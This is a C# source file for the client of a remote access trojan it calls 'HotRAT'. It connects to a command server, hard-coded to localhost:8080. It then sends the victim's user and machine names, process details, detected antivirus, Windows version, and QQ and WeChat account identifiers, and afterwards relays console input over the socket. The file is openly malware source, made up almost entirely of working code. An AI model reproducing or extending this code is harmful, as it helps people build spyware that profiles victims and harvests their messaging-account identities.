using System.Diagnostics;
using System.Net.Sockets;
using System.Text;

namespace HotRAT.Client
{
    internal class Program
    {
        static async Task Main(string[] args)
        {
            using var client = new TcpClient();
            await client.ConnectAsync("localhost", 8080);

            var proc = Process.GetCurrentProcess();
            using var stream = client.GetStream();
            using var ms = new MemoryStream();
            using (var writer = new BinaryWriter(ms, Encoding.UTF8, true))
            {
                writer.Write(Environment.UserName);               // UserName
                writer.Write(Environment.MachineName);            // DeviceName
                writer.Write(proc.ProcessName);                   // ProcessName
                writer.Write(proc.Id);                            // PID
                writer.Write(GetInfo.Detect());                   // Antivirus
                writer.Write(GetInfo.GetWindowsVersion());        // WindowsVersion
                writer.Write(GetInfo.GetQQNumber());              // QQNumber
                writer.Write(GetInfo.GetWxID());                  // WxID
            }

            var data = ms.ToArray();
            var header = BitConverter.GetBytes(data.Length);
            var typeByte = new byte[] { 0x01 };

            await stream.WriteAsync(header, 0, header.Length);
            await stream.WriteAsync(typeByte, 0, typeByte.Length);
            await stream.WriteAsync(data, 0, data.Length);

            while (true)
            {
                var input = Console.ReadLine();
                if (input == "exit")
                {
                    break;
                }
                else
                {
                    var data2 = Encoding.UTF8.GetBytes(input);
                    var header2 = BitConverter.GetBytes(data2.Length);
                    var typeByte2 = new byte[] { 0x02 };

                    await stream.WriteAsync(header2, 0, header2.Length);
                    await stream.WriteAsync(typeByte2, 0, typeByte2.Length);
                    await stream.WriteAsync(data2, 0, data2.Length);
                }
            }
        }
    }
}
